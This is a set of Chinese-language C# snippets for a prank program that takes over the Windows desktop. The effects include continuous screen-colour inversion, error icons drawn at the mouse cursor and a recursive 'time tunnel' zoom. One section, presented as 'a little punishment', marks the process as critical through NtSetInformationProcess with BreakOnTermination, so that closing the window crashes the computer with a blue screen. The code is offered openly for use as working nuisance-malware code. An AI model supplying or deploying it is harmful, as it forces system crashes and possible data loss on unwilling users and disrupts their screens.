## 在整个桌面绘制
```csharp
//绘画引用
[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();

[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hwnd);

//得到桌面环境
var screen = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));

screen.DrawString(mesg, Font, Color, point);//开始画画，此部分是绘制文本
```
---
## 防止程序被结束
- 这必须给一点小小的惩罚
```csharp
//窗体被关闭就蓝屏
//添加System.Runtime.InteropServices和System.Diagnostics的引用
 
//声明引用
[DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        //窗体关闭事件，在窗体事件中的FormClosing
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
 
            Process.EnterDebugMode();  //acquire Debug Privileges
 
            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
 
        }
```

---
## 屏幕反色
```csharp
//前提函数引用
[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();

[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hwnd);

[DllImport("user32.dll")]
public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

[DllImport("gdi32.dll")]
public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

//反色线程
private void threadfanse()
    {
        //屏幕反色

        while (true)//不断重复反色
        {
            // 获取桌面窗口句柄  
            IntPtr desktop = GetDesktopWindow();
            // 获取桌面窗口的设备上下文 DC  
            IntPtr hdc = GetWindowDC(desktop);

            //获取屏幕大小
            Rectangle screenRect = Screen.PrimaryScreen.WorkingArea;


            // 反转屏幕颜色  
            BitBlt(hdc, 0, 0, screenRect.Right - screenRect.Left, screenRect.Bottom - screenRect.Top, hdc, 0, 0, 0x00330008);

            // 释放设备上下文 DC  
            ReleaseDC(desktop, hdc);

            //暂停这个线程0.5秒
            Thread.Sleep(500);
        }

    }
```
- 在 Main 方法中，首先获取桌面窗口句柄和设备上下文 DC，然后使用 GetWindowRect 函数获取桌面窗口的位置和大小，接着使用 BitBlt 函数将屏幕颜色反转。最后，我们释放设备上下文 DC，以确保资源得到正确释放。

---
## 在鼠标位置画叉
```csharp
//前提函数引用 
[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();
[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hwnd);

//画叉线程
private void threadicon()
{        
    //如果图片是bitmap类型的需要转换形式  bitmap to icon
    Bitmap bitmap = new Bitmap(Properties.Resources.icons8_cancel_48);            
    IntPtr iconHandle = bitmap.GetHicon();
    Icon icon = Icon.FromHandle(iconHandle);

    while (true)
    {
        //在鼠标位置画×

        // 获取桌面窗口句柄  
        var desktop = GetDesktopWindow();

        // 获取桌面窗口的设备上下文 DC  
        var hdc = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));

        // 获取光标位置
        Point cursor = Control.MousePosition;

        // 在光标位置处画错误图标
        hdc.DrawIcon(icon, cursor.X - 10, cursor.Y - 10);
    }
}
```

---
## 时空隧道
```csharp
//前提函数引用
[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();
[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hwnd);

//时空隧道线程
private void threadlong()
        {
            //时空隧道线程

            // 初始化参数
            double sleepTime = 1000; // 休眠时间，单位：毫秒
            Screen screen = Screen.PrimaryScreen;
            Size screenSize = screen.WorkingArea.Size;
            Point startPoint = new Point(0, 0);

            // 创建位图和绘图对象
            Bitmap screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
            Graphics screenGraphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));
            Graphics bitmapGraphics = Graphics.FromImage(screenBitmap);

            do
            {
                try
                {
                    // 每次循环都将休眠时间减少，最小为1毫秒，加快隧道生成
                    sleepTime -= 100;
                    if (sleepTime <= 0)
                    {
                        sleepTime = 200;
                    }

                    // 将屏幕截图绘制到位图上
                    bitmapGraphics.CopyFromScreen(startPoint, startPoint, screenSize);

                    // 缩放位图并将其显示为图标
                    int width = (int)(screenSize.Width * 0.9);
                    int height = (int)(screenSize.Height * 0.9);
                    int x = (int)(screenSize.Width * 0.05);
                    int y = (int)(screenSize.Height * 0.05);
                    IntPtr hIcon = screenBitmap.GetHicon();

                    //将处理好的绘制到屏幕上
                    screenGraphics.DrawIcon(Icon.FromHandle(hIcon), new Rectangle(x, y, width, height));

                    // 休眠指定时间
                    Thread.Sleep((int)sleepTime);

                    // 释放资源并重新创建位图和绘图对象
                    bitmapGraphics.Dispose();
                    screenBitmap.Dispose();
                    screenBitmap = new Bitmap(screenSize.Width, screenSize.Height);
                    bitmapGraphics = Graphics.FromImage(screenBitmap);
                }
                catch
                {
                    // 出现异常时，释放资源并等待10秒后重新开始循环
                    screenGraphics.Dispose();
                    bitmapGraphics.Dispose();
                    screenBitmap.Dispose();
                    Thread.Sleep(1000);
                }
            } while (true);
        }
```